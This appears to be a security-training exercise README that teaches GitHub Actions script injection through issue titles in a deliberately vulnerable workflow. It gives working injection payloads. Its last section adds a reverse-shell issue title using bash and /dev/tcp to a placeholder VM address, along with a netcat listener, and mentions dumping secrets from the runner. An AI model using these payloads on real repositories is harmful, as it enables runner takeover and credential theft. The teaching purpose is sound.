# Exercise 1 - :bomb: Exploiting the script injection vulnerability in the run command
The [Check issue title workflow](.github/workflows/check-issue-title.yml) uses the issue title in the `run` command as follows:
```
title="${{ github.event.issue.title }}"
```
Because this value is provided by the user when they create a new issue, this provides an opportunity for an attacker to exploit the workflow with by crafting an issue title that tricks the script into executing code where it's expecting data.

If we open an issue with the title...
```
octocat"; ls -l $GITHUB_WORKSPACE"
```
...the script looks like the following...
```
title="octocat"; ls -l $GITHUB_WORKSPACE""
```

This payload closes the initial quote, then ends the command with a semicolon. This allows the following `ls -s` command to run as a separate command.  

### Create an issue with the exploit payload
Let's see this in action by creating a new issue with this title and see what happens. Follow the steps below to exlpoit the script injection vulnerability in your repo:  
1. Go to the Issues tab and click the green `New issue` button in the top right.  
2. In the issue form type `octocat"; ls -l $GITHUB_WORKSPACE"` in the title field.  
3. Leave the description field empty and click the green `Create` button in the bottom rigth.  
4. Navigate to the Actions tab and select the `Check issue title` actions workflow on the left.  
5. Click on the workflow run.  
6. Click on the job `check-issue-title`.  
7. In the `check-issue-title` job lob, click the `>` to the left of `Check issue title` step to see the output.  
8. Observe that the workflow runs the command `ls -l $GITHUB_WORKSPACE`!  

<img width="1042" alt="Screenshot 2023-08-30 at 7 38 43 PM" src="https://github.com/robandpdx/workflow-script-injection/assets/95243761/e3fa3917-2834-45cc-a297-d25614c3185e">

Now let's look at the [Check issue title with action workflow](.github/workflows/check-issue-title-with-action.yml) which uses an [action](.github/actions/check-issue-title-action/action.yml) using the run command. The [action](.github/actions/check-issue-title-action/action.yml) uses the issue title in the run command as follows:
```
if [[ "${{ inputs.issue-title }}" =~ ^octocat ]]; then
...
```
We'll need to craft a different payload for this because the input is used directly in the `if` statement. Let's try opening an issue with the following title...
```
" == $(ls -l $GITHUB_WORKSPACE) && "octocat
```
If we look at the run of the [Check issue title with action workflow](.github/workflows/check-issue-title-with-action.yml) that was triggered using the payload we used above, we will notice that we don't see the output of the `ls -s $GITHUB_WORKSPACE` command in the logs. So, this workflow is not vulnerable, right? Wrong! This workflow is still vulnerable to script injection. Let's try using a different payload to see some evidence of that.  

If we open an issue with the title...
```
" == $(wget github.com) && "octocat
```
...the script looks like the following...
```
if [[ "" == $(wget github.com) && "octocat" =~ ^octocat ]]; then
...
```
This payload will cause the script to run `wget github.com` as it evaluates the if condition.  

Let's see this in action by creating a new issue with this title and see what happens. Follow the steps below to exlpoit the script injection vulnerability in your repo:  
1. Go to the Issues tab and click the green `New issue` button in the top right.  
2. In the issue form type `" == $(wget github.com) && "octocat` in the title field.  
3. Leave the description field empty and click the green `Create` button in the bottom rigth.  
4. Navigate to the Actions tab and select the `Check issue title with action` actions workflow on the left.  
5. Click on the workflow run.  
6. Click on the job `check-issue-title`.  
7. In the `check-issue-title` job lob, click the `>` to the left of `Check issue title` step to see the output.  
8. Observe that the workflow log shows the output of the command `wget github.com`!  

### :imp: Getting a shell on the runner
Now let's try something a little more sinister...  
> **Note**: Because next part of this lesson requires a cloud VM with a public IP address, we will only demo this section in the workshop. We encourage you to go through this part of the exercise on your own after the workshop.  

1. Spin up a linux VM in the cloud that has a public IP address.
2. Open a command prompt and ssh into the VM
3. Run the command `nc -nvlp 1337` on the command prompt of the VM. This will cause the VM to listen on the port 1337.  
3. Next open a new issue in your repo with the title `octocat"; bash -i >& /dev/tcp/<YOUR-VM-IP-ADDRESS>/1337 0>&1 ; ls -l $GITHUB_WORKSPACE"`, replacing `<YOUR-VM-IP-ADDRESS>` with the public IP address of your cloud VM. This will cause the workflow to pipe the bash shell to your VM's IP address on port 1337.  
4. Now return to the command prompt window. As the worklfow runs, you will see your command prompt window drop into a shell on the runner. Now you have a shell on the runner! This is a great "foot in the door" from which I can attemp other exploits, like dumping secrets or cloud credentials to use in other attacks.  

